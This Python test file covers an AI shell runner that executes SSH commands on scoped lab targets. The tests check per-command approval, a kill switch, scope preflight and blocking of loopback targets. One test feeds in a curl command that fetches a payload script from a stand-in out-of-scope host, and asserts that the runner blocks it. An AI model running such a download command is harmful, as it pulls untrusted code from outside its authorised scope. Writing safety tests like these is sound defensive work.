from __future__ import annotations

import json

from workers.runners.ai_shell.runner import (
    AI_SHELL_RESULTS_ARTIFACT_NAME,
    CommandResult,
    execute_ai_shell_command,
)

FIXTURE_TARGET = "10.0.20.44"
FIXTURE_SCOPE = {"cidr_ranges": ["10.0.20.0/24"]}
FIXTURE_CREDENTIAL_REF = "vault://local-ssh-fixture/operator"


def test_ai_shell_approved_id_command_uses_deterministic_ssh_fixture_only() -> None:
    calls: list[list[str]] = []

    def fixture_runner(command: list[str], _timeout_seconds: float) -> CommandResult:
        calls.append(command)
        return CommandResult(
            returncode=0,
            stdout="uid=1000(aegispt-lab) gid=1000(aegispt-lab)\n",
            stderr="",
        )

    execution = execute_ai_shell_command(
        targets=[FIXTURE_TARGET],
        scope_allowlist=FIXTURE_SCOPE,
        command="id",
        credentials_ref=FIXTURE_CREDENTIAL_REF,
        username="operator",
        timeout_seconds=5,
        command_runner=fixture_runner,
        ssh_binary="ssh",
    )
    payload = _artifact_payload(execution)

    assert execution.exit_code == 0
    assert execution.metadata["status"] == "completed"
    assert execution.stdout.startswith("uid=1000")
    assert calls == [
        [
            "ssh",
            "-o",
            "BatchMode=yes",
            "-o",
            "StrictHostKeyChecking=accept-new",
            "-p",
            "22",
            f"operator@{FIXTURE_TARGET}",
            "id",
        ]
    ]
    assert payload["command"] == "id"
    assert payload["target"] == FIXTURE_TARGET
    assert payload["safety"]["ssh_only"] is True
    assert payload["safety"]["per_command_approval_required"] is True
    assert payload["safety"]["scope_checked"] is True


def test_ai_shell_kill_switch_blocks_before_ssh_command_runner() -> None:
    def forbidden_runner(_command: list[str], _timeout_seconds: float) -> CommandResult:
        raise AssertionError("kill switch must block before SSH execution")

    execution = execute_ai_shell_command(
        targets=[FIXTURE_TARGET],
        scope_allowlist=FIXTURE_SCOPE,
        command="id",
        credentials_ref=FIXTURE_CREDENTIAL_REF,
        username="operator",
        command_runner=forbidden_runner,
        kill_switch_check=lambda: True,
    )
    payload = _artifact_payload(execution)

    assert execution.exit_code == 1
    assert execution.metadata["status"] == "blocked"
    assert execution.metadata["reason"] == "ai_shell_kill_switch"
    assert payload["status"] == "blocked"
    assert payload["reason"] == "ai_shell_kill_switch"
    assert payload["safety"]["blocked_before_execution"] is True


def test_ai_shell_out_of_scope_curl_is_blocked_during_preflight() -> None:
    def forbidden_runner(_command: list[str], _timeout_seconds: float) -> CommandResult:
        raise AssertionError("out-of-scope curl must block during preflight")

    execution = execute_ai_shell_command(
        targets=[FIXTURE_TARGET],
        scope_allowlist=FIXTURE_SCOPE,
        command="curl https://out-of-scope.example.test/payload.sh",
        credentials_ref=FIXTURE_CREDENTIAL_REF,
        username="operator",
        command_runner=forbidden_runner,
    )
    payload = _artifact_payload(execution)

    assert execution.exit_code == 1
    assert execution.metadata["status"] == "blocked"
    assert execution.metadata["reason"] == "out_of_scope_download_url"
    assert payload["status"] == "blocked"
    assert payload["reason"] == "out_of_scope_download_url"
    assert payload["safety"]["blocked_before_execution"] is True


def test_ai_shell_loopback_fixture_is_honestly_blocked_by_current_safety_contract() -> None:
    execution = execute_ai_shell_command(
        targets=["127.0.0.1"],
        scope_allowlist={"hosts": ["127.0.0.1"]},
        command="id",
        credentials_ref=FIXTURE_CREDENTIAL_REF,
        username="operator",
    )
    payload = _artifact_payload(execution)

    assert execution.exit_code == 1
    assert execution.metadata["reason"] == "local_target_blocked"
    assert payload["status"] == "blocked"
    assert payload["reason"] == "local_target_blocked"


def _artifact_payload(execution) -> dict:
    artifact = next(item for item in execution.artifacts if item.name == AI_SHELL_RESULTS_ARTIFACT_NAME)
    return json.loads(artifact.data.decode("utf-8"))
